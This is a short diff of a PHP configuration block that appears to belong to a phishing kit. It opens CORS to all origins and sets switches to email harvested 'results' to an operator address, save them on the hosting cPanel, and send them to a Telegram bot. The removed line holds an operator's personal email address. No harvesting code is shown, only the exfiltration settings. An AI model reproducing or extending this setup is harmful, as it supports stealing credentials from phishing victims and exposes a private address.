@@ -7,7 +7,7 @@ header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
 header("Access-Control-Allow-Headers: x-test-header, Origin, X-Requested-With, Content-Type, Accept");
 ////////////////////////////////////////////////////////////////////////////////
 
-$send = "loftus.cheeks@protonmail.com"; // YOUR EMAIL GOES HERE
+$send = ""; // YOUR EMAIL GOES HERE
 $Send_Log  = 1; // SEND RESULTS TO EMAIL
 $Save_Log  = 1; // SAVE RESULTS TO CPANEL
 $Tele_bot  = 1; //SENDS RESULTS TO TELEGRAM
